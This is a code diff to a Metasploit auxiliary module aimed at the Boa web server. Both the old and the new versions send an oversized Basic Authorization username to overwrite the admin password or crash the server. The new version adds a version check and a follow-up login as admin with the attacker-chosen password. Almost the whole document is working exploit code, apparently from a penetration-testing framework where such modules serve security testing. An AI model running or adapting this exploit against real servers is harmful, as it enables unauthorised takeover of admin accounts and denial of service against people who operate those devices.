@@ -13,7 +13,8 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Tcp
+	include Msf::Exploit::Remote::HttpClient
+        include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
@@ -43,34 +44,56 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(80),
 				OptString.new('URI', [ true,  "The request URI", '/']),
-				OptString.new('Password', [true, 'The password to set (if possible)', 'pass'])
+				OptString.new('PASSWORD', [true, 'The password to set (if possible)', 'pass'])
 			], self.class)
 	end
 
+        def check
+          begin
+		connect
+		sock.put('GET / HTTP/1.0\r\n\r\n')
+		resp = sock.get_once
+		disconnect
+
+		if (resp and (m = resp.match(/Server: Boa\/(.*)/)))
+                  print_status("Boa Version Detected: #{m[1]}")
+                  return Exploit::CheckCode::Safe if (m[1][0]>0) # boa server wrong version
+                  return Exploit::CheckCode::Safe if (m[1][3]>4)
+                  return Exploit::CheckCode::Vulnerable
+                else
+                  print_status("Not a Boa Server!")
+                  return Exploit::CheckCode::Safe # not a boa server
+                end
+          rescue Rex::ConnectionRefused
+            print_error("Connection refused by server.")
+            return Exploit::CheckCode::Safe
+          end
+	end
 	def run
-		begin
-			connect
-			print_status("Sending packet to #{rhost}:#{rport}")
-			auth = "X" * 127
-			auth << ":"
-			auth << datastore['Password']
-
-			sploit = "GET "
-			sploit << datastore['URI']
-			sploit << " HTTP/1.1\r\nAuthorization: Basic\r\n"
-			sploit << Base64.encode64(auth)
-			sploit << "\r\n\r\n"
-
-			sock.put(sploit)
-			disconnect
-
-			print_status("Server not crashed.  Either the attack was successful and the password for 'admin' has been changed to #{datastore['Password']} or this server is not vulnerable.")
-
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			print_status("Unable to connect to #{rhost}:#{rport}.")
-		rescue ::ERRNO::ECONNRESET
-			print_status("DoS packet successful. #{rhost} not responding.")
-		rescue ::Timeout::Error, ::Errno::EPIPE
-		end
+          if check == Exploit::CheckCode::Vulnerable
+            datastore['BasicAuthUser'] = Rex::Text.rand_text_alpha(127)
+            datastore['BasicAuthPass'] = datastore['PASSWORD']
+            res = send_request_cgi({
+                                     'uri'=> datastore['URI'],
+                                     'method'=>'GET'
+                                   })
+            if (res != nil)
+              print_status("Server still operational... checking to see if password has been overwritten.")
+              datastore['BasicAuthUser'] = 'admin'
+              res = send_request_cgi({
+                                       'uri'=>datastore['URI'],
+                                       'method'=>'GET'
+                                     })
+              if (res.code == 200)
+                print_status("Access successful with admin:#{datastore['PASSWORD']}")
+              elsif (res.code != 403)
+                print_status("Access not forbidden, but another error has occured: Code #{res.code} encountered")
+              else
+                print_status("Access forbidden, this module has failed.")
+              end
+            else
+              print_status("Denial of Service has succeeded.")
+            end
+          end		
 	end
 end
